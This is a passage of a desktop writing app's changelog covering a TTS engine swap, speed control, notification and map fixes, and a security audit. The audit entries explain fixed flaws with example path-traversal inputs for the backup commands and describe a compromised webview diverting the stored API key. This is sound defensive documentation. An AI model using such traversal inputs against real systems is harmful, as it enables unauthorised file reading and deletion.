# Changelog

## 0.2.3 (2026-10-24)

### Phonon model name — directory mapping

**Decision: the model registry key IS the on-disk directory name** — the
registry already documents "metadata by filename or directory name", so
`tts_start(model)` now works end-to-end with no alias table. The phonon
model dir is `models/phonon-31m-en/` (was `models/phonon/`).

- `sidecar.rs`: new `tts_model_dir` joins `<sidecars_dir>/models/<key>`
  for the exe (after `check_model_name` keeps separators/`..` out); a
  missing dir errors actionably (names `fetch_sidecars.py --phonon`);
  the python fallback keeps the bare key; no model — exe default.
- `phonon-server`: default `$JWE_SIDECARS_DIR/models/phonon-31m-en`,
  legacy `models/phonon` still resolves; the fetch script migrates
  the old dir on next run (local install migrated + re-verified).
- Bundle resource glob and docs/MODELS.md follow the new path.

Tests: 2 new Rust tests (join + traversal rejection), 5 tts-timeline
wiring pins, e2e model-override pin extended. Gates: cargo 154/0,
e2e 217/217, tts-timeline 51/51, svelte-check 0/0, build, source
359/359; pinned fetch re-run exit 0 post-migration; pipe smoke on
all three launch paths (explicit dir, env default, legacy fallback)
synthesizes valid WAV and exits 0.

### Phonon TTS swap — owner pass verified end-to-end

**The swap (owner commits 6a1aca2/b461a33).** Kokoro/sherpa-onnx is
replaced by `phonon-server.exe`, a Rust sidecar under
`src-tauri/sidecars/phonon-server/` speaking the same JSON-lines stdio
protocol (health/synthesize/stream_*/stop), with boot guard
`JWE_SIDECAR_TOKEN` (same contract as the Python sidecars; the backend
already sets it at spawn). `fetch_sidecars.py --phonon` fetches the
Gradium 31M English q8 checkpoint + the 102-voice catalog.

**Verification pass (2026-10-23) fixed five real defects:**
1. Voice fetch URL was doubled — `PHONON_VOICE_BASE` ended in
   `/voices/` while each catalog `filename` already starts with
   `voices/`, so every voice 404'd; and the first failure aborted the
   loop, leaving ALL 102 voices missing while the run looked mostly
   fine. Dest path was likewise nested `voices/voices/`, which the
   runtime never scans (it looks flat under `voices/`).
2. `config.json`/`tokenizer.json`/`default-voice.safetensors` all
   verified against the GGUF's pin key — with real pins every non-GGUF
   file would fail. Now keyed per artifact, with real SHA-256s for all
   five core files plus 102 per-voice pins committed as
   `src-tauri/sidecars/phonon_voice_pins.json`; a fully pinned re-run
   exits 0 verifying everything.
3. `default-voice.safetensors` was never registered — it lives in the
   model root, but only `voices/` was scanned and the catalog doesn't
   reference it, so bare `synthesize` (no voice) ALWAYS failed with
   "no voice 'default' registered". `voices.rs` now registers it as
   "default"; health's `default_voice` falls back to the catalog
   preference and reports `default`.
4. The windows bundle resource glob pointed at
   `../sidecars/models/phonon/**/*` (repo-root — never where fetch
   writes) → now `sidecars/models/phonon/**/*`.
5. e2e pins updated: bundled-executable preference now asserts the
   `phonon-server.exe`-before-`tts_server.py` ordering, and the crate
   pin follows the relocated `src-tauri/sidecars/phonon-server/` path.

**IPC note.** `tts_start`'s contract comment moved ABOVE the param
list: the e2e arg-spelling pin captures params up to the first closing
paren, and comment text inside the list hid `python_path`.

**Smoke (exe over a pipe, both argv[1] model dir and
`JWE_SIDECARS_DIR` fallback):** boot guard refuses a tokenless spawn;
ready line; health ok (24 kHz, 205 registered voices, default
voice = "default"); synthesize with default and named voice (Zoey)
returns valid WAV; unknown method errors without killing the process;
EOF exits 0. Gates: cargo 152/0, svelte-check 0/0, build green, e2e
216/216, tts-timeline 46/46, source suite 359/359, all surface
suites, assets preflight.

### read-aloud phase 4: WSOLA speed + pill progress

**WSOLA speed in the renderer (plan phase 4).** Speed no longer rides on
native synthesis: `tts_render.rs` gained a pitch-preserving WSOLA
time-stretch (`wsola_stretch`, frame 1024 / hop 512 / ±256 lag search by
normalized cross-correlation, window-normalized OLA) applied per segment
AFTER synthesis+resampling and BEFORE offsets are finalized — so the
timeline stays sample-accurate at any rate and pauses keep their exact
configured milliseconds at every speed. Synthesis now always runs at its
native rate; the sidecar's `speed` remains only for the Settings Preview
button. A new `tts_render_set_speed` command (registered + permitted like
its siblings) mutates the job's live speed: the producer reads it per
segment, so Ctrl+Shift+↑/↓ (new, 0.5–2.0 in 0.1 steps — the slider's
range) lands from the render frontier (≤ one page) with no re-synthesis
and no pitch shift. The slider and shortcut share one path: both write
`settings.ttsSpeed`, and ReadAloudButton's settings subscription pushes
changes to the running job.

**Pill progress %.** The transport pill now shows a live percentage
(`aria-label="Read progress"`): segment-based until the render's total
length is known, then continuous from the AUDIO clock via a new optional
`onProgress` hook on the player (≥0.5 % steps, clamped, pure
`progressRatio` math unit-tested).

Rust tests: `wsola_stretch` identity at rate 1, length tracking (1.5×/
0.75× within one frame), silence/steady-level preservation, degenerate
input, pause-silence exactness under stretch, and job-speed clamping —
cargo 152/0. Node: `tests/tts-timeline.mjs` 46/46 (progress units +
wiring pins on both sides of the command).

NOTE (resolved 2026-10-23): the 2 external-edit e2e failures
(`tts-server.exe` pin + `_python_path` arg spelling) were fixed in
the Phonon verification pass above; e2e is 216/216.



Files changed: `src-tauri/src/tts_render.rs` (WSOLA + live speed +
tests), `src-tauri/src/{commands.rs,lib.rs}` (set_speed),
`src-tauri/permissions/{main.toml,autogenerated/tts_render_set_speed.toml}`,
`src/lib/tts/player.ts` (progressRatio + onProgress), `src/lib/api.ts`
(binding), `src/lib/components/ReadAloudButton.svelte` (shortcut, push,
pill %), `tests/tts-timeline.mjs`.

### listen-test harness for the render-ahead TTS

**Desktop listen-test harness** — a dev overlay for the manual Windows
listen pass over the render-ahead pipeline (gaps / mid-page skips / speed
changes). Open from the command palette ("TTS listen harness (dev)") or
boot with `?listen-harness=1`; it is an overlay, not a workspace, so no
routing/enum/sidebar pins change. The harness drives the SAME primitives
as the pill (`ensureTts → startRender → subscribeRender →
TtsTimelinePlayer → ttsRenderDemand`) against a generated 3-section test
text (~45 numbered sentences → several 45 s pages), with:

- **Gap audit** — every boundary silence is measured from the received
  SegmentTiming chain and compared to the expected pause (sentence 220 /
  paragraph 480 / section 600 ms), page joins marked ⇄ so extra samples
  at a join are individually visible; page-chain contiguity reported.
  Pure math in `src/lib/tts/boundaryAudit.ts` (node-testable).
- **Mid-page skips** — ±5 s seeks land inside received pages; sentence
  jumps and frontier seeks take the real `onMissingPage` re-render path.
- **Speed** — 0.75/1.0/1.25/1.5× re-renders the job from the current
  segment through the renderer's existing `speed` param (live-rate WSOLA
  stays phase 4).
- **Diagnostics** — phase / seg / playhead / received / renderId, underrun
  and missing-page counters, re-render count, live event log, current
  sentence, and a "listen for" checklist. In browser preview it mounts
  with transport disabled plus a desktop-only banner.

Player gained read-only getters (`playheadNow`, `pagesReceived`,
`receivedEndSamples`) for the harness readouts — no transport change.

Files changed: `src/lib/components/ListenHarness.svelte` (new),
`src/lib/stores/devHarness.ts` (new), `src/lib/tts/boundaryAudit.ts`
(new), `src/lib/tts/player.ts` (getters), `src/App.svelte` (overlay),
`src/lib/components/CommandPalette.svelte` (action),
`tests/listen-harness.mjs` (new), `package.json` (`test:listenharness`).
Tests: svelte-check 0/0, build green, `tests/listen-harness.mjs` 42/42,
e2e-browser all pass (fixed the icon pin — harness used `close`, the map
calls it `x`), affected suites (shell-nav, ws-toggles, onboard-flow, tabs,
lazy, map, theme-sweep) green. No Rust changes.

### desktop notifications wired, Node Map fixed

**Two desktop notification events (owner decision: "those 2 first").**
`tauri-plugin-notification` is registered (Rust plugin + `notification:default`
capability + npm package), and `osNotifications.ts` now routes through it on
desktop — the Windows WebView exposes no Web Notification API, so the previous
error-notification path was a silent no-op on the platform that needed it. The
Web API remains the browser-preview fallback. New events, both gated on the
existing **Show notifications while app is hidden** setting and only firing
while the app is actually hidden (the banner/panel is the in-app signal):

- **Conflict-found** — an external file change under the open doc raises
  `File changed externally` (wired in App.svelte's `file-changed` listener).
- **Long AI job finished** — a generation of ≥30 s that completes cleanly
  raises `AI job finished` (AiPanel's `generating` effect). Failures and
  cancels are suppressed: errors already escalate through the error-toast
  path, and a cancel is the user's own act.

**Node Map workspace kept and fixed** (owner decision reversed the T5 cut:
"fix NodeMapWorkspace properly with acceptance criteria and a test instead of
cutting it"). The cut staged earlier in this cycle is fully reverted — route,
sidebar group, palette entry, onboarding Novelist pin, Skills catalog/nudge,
Help row, `M` shortcut, widget enum, all six `--ws-map` theme tokens,
TabBar/RhythmWaveform/HomePane accents — and schema stays at version 5 (the
v6 map-relocation migration never shipped to a real DB). The component is
fixed against written acceptance criteria AC1–AC9 (documented in
`tests/map-surface.mjs`):

- **Idle-frame leak** (audit: "rAF loop never idles") — `draw()`
  self-scheduled animation frames forever, redrawing a settled graph 60x/s
  *and surviving workspace destroy* (onDestroy never cancelled it). Redraw
  is now effect-driven: a root `$effect(() => draw())` re-runs when any draw
  input changes (graphData, transform, hover/selection, filters, theme) and
  a settled graph schedules nothing; effects dispose with the component.
  Runtime-pinned: exactly 0 frames in an idle window, 0 after navigate-away.
- **Hit-test ignored filters** — `findNodeAt` and `fitGraph` iterated the
  UNFILTERED node list, so filtered-out docs stayed hoverable/clickable at
  their exact positions and fit framed invisible nodes. Visibility now
  lives in one pure module, `src/lib/nodeMapGraph.ts`
  (`computeVisibleNodes`/`hitTestNode`/`nodeRadius`/`applyNodeCap`), fed to
  draw, hit-test and fit through a shared derived — also killing the
  per-frame O(N²) `orphans.includes` scan (Set lookups now) and SimNode's
  snake/camel field translation (nodes are `GraphNode` straight through).
- **Canvas/hit-test desync on pane resize** — only window resize re-synced
  the backing buffer; collapsing the sidebar shifted every hit-test. The
  canvas now observes its container (`ResizeObserver`, window fallback
  where RO is unavailable).
- **Stale fit timer** — `initSimulation`'s 500 ms fit was never cleared: it
  fired into destroyed components and re-fired on refresh, yanking a user's
  pan. Now re-armed cleanly and cleared on destroy.
- **Shortcuts fired while typing** — f/F/Enter in the tag-filter input
  yanked the viewport / reopened the selected doc; the keydown handler
  ignores editable targets.

New `tests/map-surface.mjs` (`npm run test:map`): AC1–AC9 as 49 checks —
pure-module units (visibility/hit/cap), lifecycle source pins, and a jsdom
boot with a seeded fixture vault that counts animation frames while idle and
after destroy, plus the workspace-filter end-to-end. Also fixed a latent
race in `reader-surface.mjs`: it broke its wait at >0 sections but asserted
>=3, and under CPU load the 3 s budget starved to 0 — it now waits for >=3
(assertion unchanged).

Files changed: `src-tauri/{Cargo.toml,lib.rs,capabilities/main-window.json}`,
`src/lib/osNotifications.ts`, `src/lib/components/{AiPanel,SettingsPane}.svelte`,
`src/App.svelte` (notifications); `src/lib/components/NodeMapWorkspace.svelte`,
`src/lib/nodeMapGraph.ts` (new), `tests/map-surface.mjs` (new),
`tests/reader-surface.mjs`, `package.json` (Map fix).
Tests: svelte-check 0/0, build green, cargo check warning-free, cargo test
146/0 (1 ignored), 49/49 direct `tests/*.mjs` + all 4 variant suites,
smoke 3/3, memory-files ALL PASS, test:assets OK.

### sidecar console silenced, logs visible

**Visible terminal on model load eliminated.** Every sidecar spawn (LLM, STT,
TTS, memory, typst, python probe) now uses `CREATE_NO_WINDOW` on Windows, so
no console window can flash. Added DETACHED_PROCESS was tested and rejected —
the STT/TTS/memory sidecars are PyInstaller onefile builds whose bootloader
spawns a second process; with DETACHED_PROCESS that grandchild allocates a
fresh **visible** console, reopening the exact bug. Measured and documented in
`procutil.rs`.

**Sidecar stderr/stdout redirected to an app log folder.** Each sidecar's
output now lands in `%LOCALAPPDATA%\com.just-write-ehis.app\logs\` as
`<name>.log` (e.g. `llm.log`, `stt.log`, `tts.log`, `memory.log`) instead of
vanishing into a hidden console. Files rotate at 4 MB (`<name>.old.log`).
The folder is created eagerly at startup so it exists to inspect *before* the
first model loads. When the folder cannot be created (unit tests, path
resolution failure) streams fall back to the null device — never to a console.

**Python probe stdin closed.** The `--version` probe now opens stdin to the
null device, so a future DETACHED_PROCESS upgrade cannot inherit an invalid
handle.

Files changed: `src-tauri/src/procutil.rs` (new), `sidecar.rs`, `ipc.rs`,
`lib.rs`, `commands.rs`.

### bundled LLM reached over a socket nobody was listening on

Writers saw `llm socket connect failed: ... (os error 10061)` when a feature
routed to the bundled LLM. That model does not bind TCP: `llama-server` sits on
a per-launch private AF_UNIX socket (`jwe-llm-<uuid>.sock`) that only has a
listener once something starts it, and the renderer starts it lazily through
`ensureLlm()`. Four backend commands ignored that - `ai_generate`,
`ai_generate_stream`, `ai_structurize` and `provider_probe` all recognise the
local sentinel endpoint (`http://127.0.0.1:8093/v1`) and talk to that socket
directly, with no ensure and no start.

The default small slot *is* the sentinel, so the exposure was the default
configuration. `ensureLlm()` guarded only 3 of roughly 7 entry points; AI-panel
chat, composer, structurize, both slot probes and ghost's fallback did not.

Ghost was also wrong by construction. Its documented fallback - "fall through to
the small slot when the local LLM fails" - lands on the same server that had
just refused the request whenever the small slot is left on its default, so a
failed (or switched-off) local model guaranteed a second raw error.

#### Fixed
- **Sentinel-routed requests ensure readiness first.** All four backend commands
  call `LlmManager::ensure_ready()`, which starts the sidecar when it is down,
  polls until `/health` reports ok (30s cap), fails fast if the child dies, and
  reuses the renderer's last start parameters so a fallback boots the configured
  model and context length rather than the defaults.
- **Frontend guards mirror that routing.** `ensureLlmFor(endpoint)` is a no-op
  for remote providers and browser preview, and now wraps AI-panel chat,
  composer, structurize, the ghost-slot probe and the Settings slot probe.
- **Ghost no longer falls back onto itself.** A sentinel small slot reports
  unavailable instead of reconnecting to a dead socket; a genuinely remote small
  slot still serves as the fallback.
- **Raw errno can no longer reach the UI.** `LlmManager::friendly()` rewrites
  connect failures into a message naming the next step, and `testSlot` records
  probe failures in the result row instead of dropping them as an unhandled
  rejection.
- **`LlmManager::start()` is idempotent** - a second start no longer unlinks the
  socket a live `llama-server` is already bound to.

#### Tests
- `tests/ghost-routing.mjs` (new, wired into `test:source`) drives the real
  module graph against a recording `api` stub: the circular fallback reaches no
  backend, a failed local start reaches neither backend, and a remote small slot
  still does.
- `ensure-poll.mjs` gains the sentinel detection checks plus a Rust parity check
  that `commands.rs` still recognises the same two host literals.
- Two Rust tests pin the friendly-error mapping and its pass-through case.

### companion widget can now host every workspace

The widget window's ACL and its workspace picker disagreed.
`SettingsPane` offered all 12 workspaces for "Widget workspace", but
`widget-window.json` granted only 9 commands, so every workspace other than
Write mounted and then had essentially every action denied by the window ACL.
Write worked only because it is the one surface that switches to the `widget_*`
command variants. Denials were not loud: the workspace rendered, then each
action failed.

Measured against the real `api.ts` mappings before the fix: novel denied 20 of
23 commands, reader 7 of 8, script 7 of 8, canvas 6 of 8, and `home` — the
fallback value for an unrecognized setting — 9 of 11.

#### Changed
- **`permissions/widget.toml` now carries 162 of the 174 app commands** — the
  same surface as `main`, minus 12 credential and whole-vault admin commands:
  `secret_get`/`secret_set`, the five `backup_*`, both `vault_rename_*`,
  `autostart_launch`, `provider_probe`, `sidecar_python_probe`. Those stay
  withheld because the companion holds no secrets (`isWidgetRoute()` strips the
  API key and skips the keychain entirely) and has no Settings surface, so
  granting them would widen its attack surface for no feature it can use.
  Updater and process-exit remain main-window only. `get_vault_path` and
  `sidecars_dir` *are* granted — they look privileged but are reachable from
  workspaces (FileBrowser, read-aloud audio).

#### Tests
- `widget-invariants.mjs` now asserts the widget carries exactly main's
  workspace surface minus the exclusion list, as an **exact** match rather than
  a subset: missing silently breaks a workspace, and extra re-opens the surface
  the exclusion list exists to keep closed. A further check asserts every
  excluded command is a real registered one, so a typo in that list cannot
  quietly widen the widget. Verified the assertion bites — removing one
  permission from `widget.toml` reports 161/162 and exits non-zero.

Gates: `cargo test --release --lib` 136 passed, `npm run check` 0/0, 16/16 JS
suites, NSIS build exit 0.

### production-readiness audit: security fix + four red suites cleared

Deep audit of the desktop app for release blockers. One real Rust
security defect was found and fixed; the rest were test-harness and
brand-consistency drift. Gates: `cargo check --release --features
custom-protocol` exits 0, `npm run check` 0/0, `npm run build` clean,
and the full `test:source`, `test:themes`, `test:smoke`, `test:e2e`,
`test:reader`, `test:readersec`, `test:mobile`, `test:ghost`,
`test:writeback`, `test:audiostop`, and `test:aipanel` suites pass.

#### Fixed
- **Security: backup restore/delete accepted a path escape from the
  renderer** (`doc_store/backups.rs`). `backup_restore` and `backup_delete`
  joined the caller's `backup_name` straight onto the backups dir, and
  `Path::join` trusts its argument: an absolute path replaces the base
  outright and `..` segments walk out of it. A compromised renderer could
  therefore read (`backup_restore("C:\...")` copies the target out and opens
  it as SQLite) or delete (`backup_delete("..\..\..\<file>")`) any file the
  process can reach. Both now route through `checked_backup_path`, which
  rejects anything that is not a single bare filename (no separators, no
  drive/colon prefix, no `..`/`.`, not empty), and `backup_delete` is scoped
  further to the `backup_` prefix `backup_create` writes, so a failed restore
  or a stray file in that folder can never be the thing that vanishes.
  Regression-guarded by `backup_names_may_not_escape_the_backup_dir`, which
  asserts nine hostile names plus a non-`backup_` in-directory name are all
  refused.
- **`test:resolve` (STT/TTS model resolution) was passing a stale port
  argument.** The servers read the model from `sys.argv[1]`; the harness
  was still passing the retired port as `argv[1]`, shifting the model name
  into `argv[2]`. The harness now passes only the model argument, so the
  traversal-rejection and fail-closed checks exercise the real resolution
  path again.
- **`test:reader` shelf assertions were racing the auto-open effect.**
  `ReaderWorkspace`'s `$effect` opens the active doc the moment the
  bookshelf resolves, so the shelf card is unobservable from outside. The
  test now settles the book view first, then reaches the shelf via the
  explicit Back button (`closeBook()`), and reopens the book to assert the
  reading controls.
- **`test:aipanel` and `test:audiostop` needed jsdom shims** for
  `Element.scrollTo` and `AudioContext.resume`, which jsdom does not
  implement. The suites now mirror the real WebView instead of throwing
  on the first scroll/stop call.

#### Corrected
- **Migration failure is not silent.** The audit listed "silent setup failure"
  in `lib.rs`. Verified against the code: `initialize()` failing sets read-only
  and `lib.rs` logs it, and every write then returns a clear error that the
  UI surfaces through `domainError`/`saveFailed`. The user finds out on the
  first save rather than at boot, which is a banner worth adding some day, but
  nothing fails quietly and there is no bug here. No change made.
- **Release workflow is *not* broken — earlier audit report was a false
  positive.** It flagged `fetch_sidecars.py --typst` in
  `.github/workflows/release.yml` as "fetches only typst, release build will
  fail". `binaries/typst` is the only entry in `tauri.conf.json` →
  `bundle.externalBin`, i.e. the sole sidecar the build actually requires;
  STT/TTS/LLM are optional and degrade at runtime
  (`native_runtime_available`). `--typst` is a valid flag and fetches exactly
  what the build needs. No change made.

#### Changed
- **PWA theme colors now match the shipped brand.**
  `public/manifest.webmanifest` still carried the pre-rebrand dark
  `#1B1A15` while `index.html` uses the light paper `#FAF9F6` (light is
  the default mode). Both `background_color` and `theme_color` are now
  `#FAF9F6`, and `test:mobile` asserts the value against `index.html`.

#### Fixed (second pass — audit follow-ups)
- **A failed migration no longer leaves its transaction open.**
  `database.rs` wrapped the migration in `BEGIN`/`COMMIT` and relied on a
  comment claiming SQLite would roll back on failure. It does not: a failed
  statement leaves the transaction open, holding its locks, until an explicit
  ROLLBACK. Because `lib.rs` deliberately keeps that same connection alive in
  read-only mode, the transaction stayed open for the life of the process. A
  `RollbackGuard` now issues ROLLBACK on drop unless COMMIT succeeded.
- **The pre-migration backup is now a consistent snapshot.**
  `backup_before_migration` copied the `.db` with `fs::copy`, but the database
  runs in WAL mode, so the newest committed transactions live in the `-wal`
  sidecar and never reached the copy — the safety net before a migration was
  an older, torn snapshot. It now uses `VACUUM INTO`, the same primitive
  `backup_create` already uses.
- **The AI API key is no longer sent to an arbitrary renderer-chosen host.**
  `authed_post` posted to `AiGenerateRequest.provider` with the stored key
  attached, unconditionally. `provider_probe` already guarded exactly this and
  documented the threat (a compromised webview aims the stored key at a host
  it controls and reads it from the response, bypassing the webview CSP that
  would block the same fetch). The generate and stream paths now apply the same
  `may_send_key` rule, and a blocked host gets an explanation instead of a
  misleading 401. Note: keys go only to known providers, `localhost`, or a
  private-network host — a custom public endpoint now needs to be reachable on
  one of those to authenticate.
- **The file watcher no longer echoes the app's own writes.** Every save fired
  `file-changed` for the file the app had just written, so an external edit
  bounced straight back as a self-triggered reload. `write_to_disk` now stamps
  the path and the watcher skips its own writes for the next few seconds
  (paths compared after normalization, so the watcher's spelling and ours
  still match). Regression-guarded by
  `self_writes_suppress_their_own_watcher_events`.
- **Streamed AI responses can no longer exhaust memory.** The SSE reader
  buffered chunks with no bound, so a broken or hostile endpoint that never
  sent a newline grew the buffer for the life of the response. A frame larger
  than 1 MiB now aborts the stream with a clear error.
- **A symlink inside the vault no longer escapes it.**
  `resolve_in_vault` checked containment lexically, which cannot see through a
  link: `link/secret.md` with `link` pointing outside the vault passed. The
  real filesystem is now checked too — the vault root and the deepest existing
  ancestor of the target are canonicalized and required to nest. Verified by
  `symlink_escape_is_refused`, which fails against the old code and passes
  against the new.
- **An unanswered autostart prompt no longer locks the user out.**
  `promptWidgetAutostart` read `window.confirm` as a boolean and burned its
  one-shot flag; a WebView that declined to show the dialog returns
  `undefined`, which was taken as "no" — the user was silently opted out and
  never asked again. An answer that is not a real boolean is now left
  unconsumed.
- **A locked-PDF import failure now explains what to do.** The error claimed
  the import was "cancelled" whether or not a prompt ever appeared, and
  carried a mojibake dash. It now says no password was supplied and suggests
  an unencrypted copy or plain-text import.
- **Sidecars no longer outlive a hard crash.** `stop()` and `Drop` terminated
  children, but neither runs when the app dies without unwinding — crash, kill,
  power loss — leaving the local LLM/STT/TTS servers orphaned, holding their
  ports and memory. Each spawn now joins a Job Object with
  `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, so Windows kills them the moment our
  handle closes. Best-effort by design: if the job cannot be created the
  sidecar still starts and the old stop/Drop path still applies. Verified by
  `spawned_sidecar_joins_the_kill_on_close_job`, which asks Windows directly
  whether the child is in the job.
- **Removed the "Detailed analytics coming soon" promise.** The panel already
  shows real figures (documents, total words, today, day streak); only the
  unshipped promise went.

#### Known-open (release blockers, need a maintainer decision — not code)
- **Updater key rotation will brick self-update for every existing install.**
  Verified from the published signature for
  `Just Write ehis_0.2.1_x64-setup.exe` (timestamp 2026-09-27 09:31 UTC):
  the shipped installer was signed with key `1C2875FB2CC4040E` (key from
  `cd0df63`, 09-26) — *not* the key at the `v0.2.1` tag, which is
  `1C2ACD78E48FDD60`. `tauri.conf.json` now carries `3FF086625EED8646`
  (from `3432429`, 09-30). The updater verifies each download against the
  pubkey compiled into the *running* binary, so every install in the field
  trusts `1C2875FB2CC4040E` and will reject a release signed with today's
  key. This is a release-process action, not a code change: the next release
  must be **signed with the superseded key `1C2875FB2CC4040E`** as a bridge
  (its binary already carries the new pubkey), and releases after that go
  back to normal. Requires the old private key — if it was deleted, the only
  remedy is a manual reinstall. Documented in `docs/UPDATES.md`
  ("Rotating the signing key").
  **Resolved in 0.2.3 (2026-10-24):** shipped as the bridge release —
  signed with `1C2875FB2CC4040E`, binary carrying `3FF086625EED8646`, so
  every install in the field can update and trusts the new key from then
  on. Releases after 0.2.3 sign with `3FF086625EED8646` as usual.
- **Browser-global dialogs: hardened, runtime behaviour still unverified.**
  `widgetAutostart.ts` no longer burns its one-shot prompt on an unanswered
  `confirm`, and `importFile.ts` reports a locked-PDF failure honestly, so
  neither is damaged by a missing dialog any more. But the underlying question
  stands: no `tauri-plugin-dialog` is installed, and both flows still rely on
  `window.confirm`/`window.prompt` (`tauri.conf.json:86`'s `"dialog": false`
  is the *updater* plugin's flag, unrelated). Whether WebView2 actually renders
  these was never checked on a real build. If they misbehave, move both to the
  dialog plugin or in-app UI.

### UX polish: trust bugs + Capture discoverability + voice, plan filed

Plan: `docs/PLANS/2026-10-09-ux-polish.md` (Phases 1–7; Phases 1–6 are
DONE). Gates for Phases 1–3: svelte-check 0/0, vite build clean,
onboard-flow + ws-toggles + shell-nav (desktop+mobile) + tabs-functional
+ e2e-browser + smoke + widget-invariants + acl-parity (174/174) +
settings-validate all pass. Phase 4 gates all green; the only failure
(test:themes) is a pre-existing esbuild "no loader for .woff/.woff2"
unrelated to these changes. Phase 5 keeps the same suite green. Phase 6
(all 12 items) gates all green.

#### Changed
- **Inbox is now labeled Capture** (workspace id stays `inbox` — no data
  migration). Sidebar, palette ("Open Capture" / "Quick Capture
  (Capture)"), mobile More menu, Home labels, PropertiesView filter,
  HelpOverlay, Settings copy, notifications, and QuickCaptureOverlay all
  speak "Capture"; toasts read "Saved to Capture" / "Captured to
  Capture".
- **Capture is a default sidebar entry** — removed from
  `DEFAULT_HIDDEN_WORKSPACES` (Canvas is the only default-hidden
  workspace now). It keeps its untriaged-count badge in the Capture nav
  group alongside Logs. Onboarding default `hiddenIds` is `["canvas"]`.

#### Fixed
- **Palette Quick Capture focuses the capture box** instead of creating
  an orphan "Untitled" doc in the inbox (was silently wrong; now matches
  the tray/status-bar behavior via `sendToCapture`).
- **Capture saves confirm with a toast** in both the Capture and Logs
  boxes ("Saved to Capture" / "Saved to Logs") — the box clears, so
  silence used to read as failure.
- **PWA-share text auto-saves** when the capture box was empty (with the
  same confirmation toast); a half-typed draft is never clobbered —
  shared text appends instead. Settings → Capture & Notifications and
  USER-GUIDE document this.
- **Capture empty state hints the shortcut** (Ctrl+Shift+F) instead of a
  bare "Inbox is empty".
- **Weekly triage banner is actionable** — an "Open Capture" button
  navigates straight to the workspace and dismisses the banner
  (`showBanner` gained an optional action; existing callers unchanged).
- **Settings → Capture & Notifications explains itself**: intro line
  covering Ctrl+Shift+F + status-bar/bottom-bar Capture entry, and
  descriptions for the Weekly Triage / Streak reminder toggles.
- **Just Write drives the real save indicator.** `queueDocSave` now calls
  `recordSave`/`saveSettled`/`saveFailed` (epoch-scoped, same contract as
  EditorPane), so the status bar follows the actual write and a failed
  save holds "error" instead of silently looking clean. The session-end
  recap reports words written THIS session (baseline at doc open), not
  the doc's lifetime total ("10,002 words in 1 min" was a lie).
- **Just Write no longer drops the last <500ms of typing** on workspace
  switch / window close: ported EditorPane's atomic-save flush +
  `pagehide` handler.
- **AI Cancel actually cancels.** `cancelGeneration` no longer nulls the
  AbortController before the token guard reads it (tokens kept appending
  after Cancel); a cancelled chat reply is dropped, never persisted to
  the conversation. Backend stream still drains (no per-request server
  abort) but nothing is appended or saved.
- **Composer/Structurize errors can no longer be inserted into the
  manuscript.** Write-back/append/copy actions hide on `Error:` output
  (same guard Chat already had); Structurize keeps Dismiss.
- **Error toasts latch until dismissed** (was: auto-vanished in 3s);
  the 3-toast cap evicts the oldest NON-error first so a data-loss error
  is never silently dropped by three success toasts.
- **Silent failures now surface:** Home dashboard load, daily-note
  open/create, auto-backup, and Reader position save all route through
  `domainError` (Reader toasts once per failure streak, not per scroll
  tick).
- **Voice dictation is honest and recoverable (Phase 3):** an empty
  transcription toasts "Nothing heard — try again, closer to the mic.";
  the mic button re-probes after a dead start (gated button is now a
  Retry) with humanized errors (permission denied / no mic / busy) and
  `role="alert"`; a starting in-flight guard prevents double-tap leaks;
  Esc mid-recording discards the take; mic/read-aloud state clears on
  the next attempt instead of lingering from last session.
- **Read-aloud pause/resume with position memory:** pause suspends the
  audio context (or browser speech) and resumes mid-section; stop keeps
  the current section so the next play restarts there, not at the top;
  Esc stops but keeps the section for resume.
- **Read-aloud follows along in the editor:** the active section is
  highlighted and scrolled into view (`.cm-tts-current`), matching the
  Reader's section flow; works in EditorPane and Just Write.
- **Settings → "Test TTS" actually plays a test voice** and leaves the
  Kokoro sidecar warm on success (was: silent probe that stopped the
  sidecar).
- **Idle model offload is announced** — "unloaded to save RAM" toasts
  when the STT/TTS/LLM sidecars are released (was: invisible).
- **Voice shortcuts:** Ctrl+Shift+M toggles dictation, Ctrl+Shift+A
  toggles read-aloud (Esc stops), Ctrl+Shift+↑/↓ adjusts speed
  (0.25–4×); documented in the shortcuts overlay's new Voice category.
- **Reading mode is no longer a trap (4.1):** Esc closes it (it used to
  swallow the key with no way out), and a floating "Exit reading mode"
  pill appears at the top-right so mouse-only users aren't stranded.
- **Themed markdown highlighting (4.2):** headings, bold, italic, links,
  quotes and lists now use the active palette (including glass light) in
  both EditorPane and Just Write, instead of default CodeMirror colors
  and literal `#` markers. Added `@codemirror/language` +
  `@lezer/highlight` as direct deps.
- **Typewriter scrolling is proportional and calm (4.3):** the live line
  stays in the middle third of the viewport instead of jumping to a fixed
  offset every keystroke, with scroll margins on both editors and
  `prefers-reduced-motion` respected.
- **EditorPane keeps its undo history (4.4):** theme, focus, typewriter
  and autocorrect changes now reconfigure via `Compartment` instead of
  rebuilding the editor, so Ctrl+Z survives every settings toggle.
- **One source of truth for keyboard shortcuts (4.5):** new
  `src/lib/shortcuts.ts` is imported by both the settings shortcuts panel
  and the `?` help overlay, which had drifted apart and advertised
  phantom bindings (Ctrl+S/N/O/H, Alt+1–9, Bold/Italic, and a
  "Focus Mode (F11)" tooltip that F11 never triggered). Ctrl+F find,
  Ctrl+Shift+F quick capture, Ctrl+Shift+S structurize and the voice keys
  are listed as they actually behave; bold/italic are called out as
  unreachable because the app-level Ctrl+B/Ctrl+I toggles win.
- **System theme mode (4.7):** Settings → Appearance gains a System
  option that follows the OS light/dark setting live; first paint
  resolves it before hydration. Glass modals no longer render dark-on-dark
  in light mode — frost is now theme-mode aware.
- **Zen mode is honest (4.8):** F11 now hides the status bar and the
  skill-nudge strip along with the sidebar, tab bar and breadcrumbs, so
  it really is editor-only.

#### AI chat panel (Phase 5)
- **Chat follows the stream only when you're already at the bottom.**
  Auto-scroll used to yank you down mid-read; it now tracks a
  `stickToBottom` flag and shows a floating "jump to latest" button when
  you've scrolled up (5.1). Resumed conversations open at the top and
  stay there until you send something new.
- **The input autofocuses when the panel opens** (Ctrl+J lands you
  ready to type) (5.2).
- **Composer and Structurize can now be cancelled** — up to 180s
  generations with no stop button were a trap. Both track a running
  flag, abort mid-flight, and drop a cancelled result instead of
  committing it (5.3).
- **The panel shows which model will answer** ("Main model · <name>" /
  "Light model · <name>") in a chip above the input, so the wired-up slot
  is visible at a glance (5.4).
- **Regenerate button on the last reply** — re-run the same prompt without
  retyping; reuses the open conversation and swaps the stale assistant
  turn for a fresh one (5.5).
- **Structurize label no longer contradicts itself** — the badge said
